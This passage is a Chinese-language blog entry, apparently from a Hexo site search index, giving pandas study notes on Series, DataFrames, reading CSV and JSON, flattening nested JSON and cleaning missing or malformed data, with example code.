<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>pandas学习</title>
      <link href="/2023/03/24/pandas-xue-xi/"/>
      <url>/2023/03/24/pandas-xue-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="Pandas学习"><a href="#Pandas学习" class="headerlink" title="Pandas学习"></a>Pandas学习</h1><h2 id="Pandas应用"><a href="#Pandas应用" class="headerlink" title="Pandas应用"></a>Pandas应用</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">mydataset = &#123;</span><br><span class="line">    <span class="string">&#x27;site&#x27;</span> : [<span class="string">&quot;Google&quot;</span>, <span class="string">&quot;Runoob&quot;</span>, <span class="string">&quot;Wiki&quot;</span>],</span><br><span class="line">    <span class="string">&#x27;number&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">&#125;</span><br><span class="line">myvar = pd.DataFrame(mydataset)</span><br><span class="line"><span class="built_in">print</span>(myvar)</span><br></pre></td></tr></table></figure><h2 id="Pandas-数据结构-Series"><a href="#Pandas-数据结构-Series" class="headerlink" title="Pandas 数据结构 - Series"></a>Pandas 数据结构 - Series</h2><p>Pandas Series 类似表格中的一个列（column），类似于一维数组，可以保存任何数据类型。</p><p>Series 由索引（index）和列组成，函数如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pandas.Series( data, index, dtype, name, copy)</span><br></pre></td></tr></table></figure><ul><li><strong>data</strong>：一组数据(ndarray 类型)。</li><li><strong>index</strong>：数据索引标签，如果不指定，默认从 0 开始。</li><li><strong>dtype</strong>：数据类型，默认会自己判断。</li><li><strong>name</strong>：设置名称。</li><li><strong>copy</strong>：拷贝数据，默认为 False</li></ul><p><a href="https://www.runoob.com/pandas/pandas-series.html">Pandas 数据结构 – Series | 菜鸟教程 (runoob.com)</a></p><h2 id="Pandas-数据结构-DataFrame"><a href="#Pandas-数据结构-DataFrame" class="headerlink" title="Pandas 数据结构 - DataFrame"></a>Pandas 数据结构 - DataFrame</h2><p><code>DataFrame</code> 是一个表格型的数据结构，它含有一组有序的列，每列可以是不同的值类型（数值、字符串、布尔型值）。<code>DataFrame</code> 既有行索引也有列索引，它可以被看做由 <code>Series</code> 组成的字典（共同用一个索引）。</p><p><img src="/2023/03/24/pandas-xue-xi/pandas-DataStructure.png" class="lazyload placeholder" data-srcset="/2023/03/24/pandas-xue-xi/pandas-DataStructure.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/24/pandas-xue-xi/df-dp.png" class="lazyload placeholder" data-srcset="/2023/03/24/pandas-xue-xi/df-dp.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pandas.DataFrame( data, index, columns, dtype, copy)</span><br></pre></td></tr></table></figure><ul><li><strong>data</strong>：一组数据(ndarray、series, map, lists, dict 等类型)。</li><li><strong>index</strong>：索引值，或者可以称为行标签。</li><li><strong>columns</strong>：列标签，默认为 RangeIndex (0, 1, 2, …, n) 。</li><li><strong>dtype</strong>：数据类型。</li><li><strong>copy</strong>：拷贝数据，默认为 False。</li></ul><p><a href="https://www.runoob.com/pandas/pandas-dataframe.html">Pandas 数据结构 – DataFrame | 菜鸟教程 (runoob.com)</a></p><h2 id="Pandas-CSV-文件"><a href="#Pandas-CSV-文件" class="headerlink" title="Pandas CSV 文件"></a>Pandas CSV 文件</h2><p><code>CSV</code>（Comma-Separated Values，逗号分隔值，有时也称为字符分隔值，因为分隔字符也可以不是逗号），其文件以纯文本形式存储表格数据（数字和文本）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="comment"># 从.csv文件中读取</span></span><br><span class="line">df = pd.read_csv(<span class="string">&#x27;nba.csv&#x27;</span>)</span><br><span class="line"><span class="comment"># to_string() 用于返回DataFrame类型的数据，如果不使用该函数，则输出结果为数据的前面 5 行和末尾 5 行，中间部分以 ... 代替。</span></span><br><span class="line"><span class="built_in">print</span>(df.to_string())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存 dataframe</span></span><br><span class="line">df.to_csv(<span class="string">&#x27;site.csv&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># head( n ) 方法用于读取前面的 n 行，如果不填参数 n ，默认返回 5 行</span></span><br><span class="line"><span class="built_in">print</span>(df.head())</span><br><span class="line"></span><br><span class="line"><span class="comment"># tail( n ) 方法用于读取尾部的 n 行，如果不填参数 n ，默认返回 5 行，空行各个字段的值返回 NaN。</span></span><br><span class="line"><span class="built_in">print</span>(df.tail())</span><br><span class="line"></span><br><span class="line"><span class="comment"># info() 方法返回表格的一些基本信息</span></span><br><span class="line"><span class="built_in">print</span>(df.info())</span><br></pre></td></tr></table></figure><h2 id="Pandas-JSON"><a href="#Pandas-JSON" class="headerlink" title="Pandas JSON"></a>Pandas JSON</h2><p><code>JSON</code>（<strong>J</strong>ava<strong>S</strong>cript <strong>O</strong>bject <strong>N</strong>otation，JavaScript 对象表示法），是存储和交换文本信息的语法，类似 XML。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">df = pd.read_json(<span class="string">&#x27;sites.json&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(df.to_string())</span><br><span class="line"></span><br><span class="line"><span class="comment"># JSON 对象与 Python 字典具有相同的格式，所以我们可以直接将 Python 字典转化为 DataFrame 数据</span></span><br><span class="line"><span class="comment"># 字典格式的 JSON                                                                                             </span></span><br><span class="line">s = &#123;</span><br><span class="line">    <span class="string">&quot;col1&quot;</span>:&#123;<span class="string">&quot;row1&quot;</span>:<span class="number">1</span>,<span class="string">&quot;row2&quot;</span>:<span class="number">2</span>,<span class="string">&quot;row3&quot;</span>:<span class="number">3</span>&#125;,</span><br><span class="line">    <span class="string">&quot;col2&quot;</span>:&#123;<span class="string">&quot;row1&quot;</span>:<span class="string">&quot;x&quot;</span>,<span class="string">&quot;row2&quot;</span>:<span class="string">&quot;y&quot;</span>,<span class="string">&quot;row3&quot;</span>:<span class="string">&quot;z&quot;</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 读取 JSON 转为 DataFrame                                                                                   </span></span><br><span class="line">df = pd.DataFrame(s)</span><br><span class="line"><span class="built_in">print</span>(df)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从 URL 中读取 JSON 数据</span></span><br><span class="line">URL = <span class="string">&#x27;https://static.runoob.com/download/sites.json&#x27;</span></span><br><span class="line">df = pd.read_json(URL)</span><br><span class="line"><span class="built_in">print</span>(df)</span><br></pre></td></tr></table></figure><p><code>json_normalize()</code> 方法将内嵌的数据完整的解析出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 Python JSON 模块载入数据</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;nested_list.json&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = json.loads(f.read())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 展平数据</span></span><br><span class="line">df_nested_list = pd.json_normalize(data, record_path =[<span class="string">&#x27;students&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(df_nested_list)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">data = json.loads(f.read()) 使用 Python JSON 模块载入数据。</span></span><br><span class="line"><span class="string">json_normalize() 使用了参数 record_path 并设置为 [&#x27;students&#x27;] 用于展开内嵌的 JSON 数据 students。</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示结果还没有包含 school_name 和 class 元素，如果需要展示出来可以使用 meta 参数来显示这些元数据</span></span><br><span class="line"><span class="comment"># 展平数据</span></span><br><span class="line">df_nested_list = pd.json_normalize(</span><br><span class="line">    data,</span><br><span class="line">    record_path =[<span class="string">&#x27;students&#x27;</span>],</span><br><span class="line">    meta=[<span class="string">&#x27;school_name&#x27;</span>, <span class="string">&#x27;class&#x27;</span>]</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(df_nested_list)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 读取更复杂的 JSON 数据，该数据嵌套了列表和字典</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;school_name&quot;</span>: <span class="string">&quot;local primary school&quot;</span>,</span><br><span class="line">    <span class="string">&quot;class&quot;</span>: <span class="string">&quot;Year 1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;info&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;president&quot;</span>: <span class="string">&quot;John Kasich&quot;</span>,</span><br><span class="line">      <span class="string">&quot;address&quot;</span>: <span class="string">&quot;ABC road, London, UK&quot;</span>,</span><br><span class="line">      <span class="string">&quot;contacts&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;email&quot;</span>: <span class="string">&quot;admin@e.com&quot;</span>,</span><br><span class="line">        <span class="string">&quot;tel&quot;</span>: <span class="string">&quot;123456789&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;students&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;id&quot;</span>: <span class="string">&quot;A001&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Tom&quot;</span>,</span><br><span class="line">        <span class="string">&quot;math&quot;</span>: <span class="number">60</span>,</span><br><span class="line">        <span class="string">&quot;physics&quot;</span>: <span class="number">66</span>,</span><br><span class="line">        <span class="string">&quot;chemistry&quot;</span>: <span class="number">61</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;id&quot;</span>: <span class="string">&quot;A002&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;James&quot;</span>,</span><br><span class="line">        <span class="string">&quot;math&quot;</span>: <span class="number">89</span>,</span><br><span class="line">        <span class="string">&quot;physics&quot;</span>: <span class="number">76</span>,</span><br><span class="line">        <span class="string">&quot;chemistry&quot;</span>: <span class="number">51</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;id&quot;</span>: <span class="string">&quot;A003&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Jenny&quot;</span>,</span><br><span class="line">        <span class="string">&quot;math&quot;</span>: <span class="number">79</span>,</span><br><span class="line">        <span class="string">&quot;physics&quot;</span>: <span class="number">90</span>,</span><br><span class="line">        <span class="string">&quot;chemistry&quot;</span>: <span class="number">78</span></span><br><span class="line">    &#125;]</span><br><span class="line">&#125;</span><br><span class="line">df = pd.json_normalize(</span><br><span class="line">    data,</span><br><span class="line">    record_path =[<span class="string">&#x27;students&#x27;</span>],</span><br><span class="line">    meta=[</span><br><span class="line">        <span class="string">&#x27;class&#x27;</span>,</span><br><span class="line">        [<span class="string">&#x27;info&#x27;</span>, <span class="string">&#x27;president&#x27;</span>],</span><br><span class="line">        [<span class="string">&#x27;info&#x27;</span>, <span class="string">&#x27;contacts&#x27;</span>, <span class="string">&#x27;tel&#x27;</span>]</span><br><span class="line">    ]</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(df)</span><br></pre></td></tr></table></figure><p><img src="/2023/03/24/pandas-xue-xi/image-20230324140018674.png" class="lazyload placeholder" data-srcset="/2023/03/24/pandas-xue-xi/image-20230324140018674.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># glom 模块来处理数据套嵌，glom 模块允许我们使用 . 来访问内嵌对象的属性</span></span><br><span class="line"><span class="comment"># conda install glom</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;school_name&quot;</span>: <span class="string">&quot;local primary school&quot;</span>,</span><br><span class="line">    <span class="string">&quot;class&quot;</span>: <span class="string">&quot;Year 1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;students&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;id&quot;</span>: <span class="string">&quot;A001&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Tom&quot;</span>,</span><br><span class="line">        <span class="string">&quot;grade&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;math&quot;</span>: <span class="number">60</span>,</span><br><span class="line">            <span class="string">&quot;physics&quot;</span>: <span class="number">66</span>,</span><br><span class="line">            <span class="string">&quot;chemistry&quot;</span>: <span class="number">61</span></span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;id&quot;</span>: <span class="string">&quot;A002&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;James&quot;</span>,</span><br><span class="line">        <span class="string">&quot;grade&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;math&quot;</span>: <span class="number">89</span>,</span><br><span class="line">            <span class="string">&quot;physics&quot;</span>: <span class="number">76</span>,</span><br><span class="line">            <span class="string">&quot;chemistry&quot;</span>: <span class="number">51</span></span><br><span class="line">        &#125;</span><br><span class="line">       </span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;id&quot;</span>: <span class="string">&quot;A003&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Jenny&quot;</span>,</span><br><span class="line">        <span class="string">&quot;grade&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;math&quot;</span>: <span class="number">79</span>,</span><br><span class="line">            <span class="string">&quot;physics&quot;</span>: <span class="number">90</span>,</span><br><span class="line">            <span class="string">&quot;chemistry&quot;</span>: <span class="number">78</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;]</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">from</span> glom <span class="keyword">import</span> glom</span><br><span class="line"></span><br><span class="line">df = pd.DataFrame(data)</span><br><span class="line"></span><br><span class="line">data = df[<span class="string">&#x27;students&#x27;</span>].apply(<span class="keyword">lambda</span> row: glom(row, <span class="string">&#x27;grade.math&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure><h2 id="数据清洗"><a href="#数据清洗" class="headerlink" title="数据清洗"></a>数据清洗</h2><blockquote><p>数据清洗是对一些没有用的数据进行处理的过程。多数据集存在数据缺失、数据格式错误、错误数据或重复数据的情况，如果要对使数据分析更加准确，就需要对这些没有用的数据进行处理。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如果我们要删除包含空字段的行，可以使用 dropna() 方法</span></span><br><span class="line">DataFrame.dropna(axis=<span class="number">0</span>, how=<span class="string">&#x27;any&#x27;</span>, thresh=<span class="literal">None</span>, subset=<span class="literal">None</span>, inplace=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><ul><li>axis：默认为 <strong>0</strong>，表示逢空值剔除整行，如果设置参数 <strong>axis＝1</strong> 表示逢空值去掉整列。</li><li>how：默认为 <strong>‘any’</strong> 如果一行（或一列）里任何一个数据有出现 NA 就去掉整行，如果设置 <strong>how=’all’</strong> 一行（或列）都是 NA 才去掉这整行。</li><li>thresh：设置需要多少非空值的数据才可以保留下来的。</li><li>subset：设置想要检查的列。如果是多个列，可以使用列名的 list 作为参数。</li><li>inplace：如果设置 True，将计算得到的值直接覆盖之前的值并返回 None，修改的是源数据。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 通过 isnull() 判断各个单元格是否为空</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df = pd.read_csv(<span class="string">&#x27;property-data.csv&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (df[<span class="string">&#x27;NUM_BEDROOMS&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span> (df[<span class="string">&#x27;NUM_BEDROOMS&#x27;</span>].isnull())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Pandas 把 n/a 和 NA 当作空数据，na 不是空数据，不符合我们要求，我们可以指定空数据类型</span></span><br><span class="line">missing_values = [<span class="string">&quot;n/a&quot;</span>, <span class="string">&quot;na&quot;</span>, <span class="string">&quot;--&quot;</span>]</span><br><span class="line">df = pd.read_csv(<span class="string">&#x27;property-data.csv&#x27;</span>, na_values = missing_values)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (df[<span class="string">&#x27;NUM_BEDROOMS&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span> (df[<span class="string">&#x27;NUM_BEDROOMS&#x27;</span>].isnull())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认情况下，dropna() 方法返回一个新的 DataFrame，不会修改源数据。</span></span><br><span class="line"><span class="comment"># 如果你要修改源数据 DataFrame, 可以使用 inplace = True 参数:</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df = pd.read_csv(<span class="string">&#x27;property-data.csv&#x27;</span>)</span><br><span class="line"></span><br><span class="line">df.dropna(inplace = <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 也可以移除指定列有空值的行</span></span><br><span class="line"><span class="comment"># 移除 ST_NUM 列中字段值为空的行</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df = pd.read_csv(<span class="string">&#x27;property-data.csv&#x27;</span>)</span><br><span class="line"></span><br><span class="line">df.dropna(subset=[<span class="string">&#x27;ST_NUM&#x27;</span>], inplace = <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(df.to_string())</span><br></pre></td></tr></table></figure><p><img src="/2023/03/24/pandas-xue-xi/image-20230324143247743.png" class="lazyload placeholder" data-srcset="/2023/03/24/pandas-xue-xi/image-20230324143247743.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 也可以 fillna() 方法来替换一些空字段</span></span><br><span class="line"><span class="comment"># 使用 12345 替换空字段</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df = pd.read_csv(<span class="string">&#x27;property-data.csv&#x27;</span>)</span><br><span class="line"></span><br><span class="line">df.fillna(<span class="number">12345</span>, inplace = <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(df.to_string())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 也可以指定某一个列来替换数据</span></span><br><span class="line"><span class="comment"># 使用 12345 替换 PID 为空数据</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df = pd.read_csv(<span class="string">&#x27;property-data.csv&#x27;</span>)</span><br><span class="line"></span><br><span class="line">df[<span class="string">&#x27;PID&#x27;</span>].fillna(<span class="number">12345</span>, inplace = <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(df.to_string())</span><br></pre></td></tr></table></figure><blockquote><p>替换空单元格的常用方法是计算列的均值、中位数值或众数。</p><p>Pandas使用 mean()、median() 和 mode() 方法计算列的均值（所有值加起来的平均值）、中位数值（排序后排在中间的数）和众数（出现频率最高的数）。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 mean() 方法计算列的均值并替换空单元格</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df = pd.read_csv(<span class="string">&#x27;property-data.csv&#x27;</span>)</span><br><span class="line"></span><br><span class="line">x = df[<span class="string">&quot;ST_NUM&quot;</span>].mean()</span><br><span class="line"></span><br><span class="line">df[<span class="string">&quot;ST_NUM&quot;</span>].fillna(x, inplace = <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(df.to_string())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 median() 方法计算列的中位数并替换空单元格</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df = pd.read_csv(<span class="string">&#x27;property-data.csv&#x27;</span>)</span><br><span class="line"></span><br><span class="line">x = df[<span class="string">&quot;ST_NUM&quot;</span>].median()</span><br><span class="line"></span><br><span class="line">df[<span class="string">&quot;ST_NUM&quot;</span>].fillna(x, inplace = <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(df.to_string())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 mode() 方法计算列的众数并替换空单元格</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df = pd.read_csv(<span class="string">&#x27;property-data.csv&#x27;</span>)</span><br><span class="line"></span><br><span class="line">x = df[<span class="string">&quot;ST_NUM&quot;</span>].mode()</span><br><span class="line"></span><br><span class="line">df[<span class="string">&quot;ST_NUM&quot;</span>].fillna(x, inplace = <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(df.to_string())</span><br></pre></td></tr></table></figure><h3 id="Pandas-清洗格式错误数据"><a href="#Pandas-清洗格式错误数据" class="headerlink" title="Pandas 清洗格式错误数据"></a>Pandas 清洗格式错误数据</h3><p>数据格式错误的单元格会使数据分析变得困难，甚至不可能。我们可以通过包含空单元格的行，或者将列中的所有单元格转换为相同格式的数据。以下实例会格式化日期：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第三个日期格式错误</span></span><br><span class="line">data = &#123;</span><br><span class="line">  <span class="string">&quot;Date&quot;</span>: [<span class="string">&#x27;2020/12/01&#x27;</span>, <span class="string">&#x27;2020/12/02&#x27;</span> , <span class="string">&#x27;20201226&#x27;</span>],</span><br><span class="line">  <span class="string">&quot;duration&quot;</span>: [<span class="number">50</span>, <span class="number">40</span>, <span class="number">45</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">df = pd.DataFrame(data, index = [<span class="string">&quot;day1&quot;</span>, <span class="string">&quot;day2&quot;</span>, <span class="string">&quot;day3&quot;</span>])</span><br><span class="line"></span><br><span class="line">df[<span class="string">&#x27;Date&#x27;</span>] = pd.to_datetime(df[<span class="string">&#x27;Date&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(df.to_string())</span><br></pre></td></tr></table></figure><h3 id="Pandas-清洗错误数据"><a href="#Pandas-清洗错误数据" class="headerlink" title="Pandas 清洗错误数据"></a>Pandas 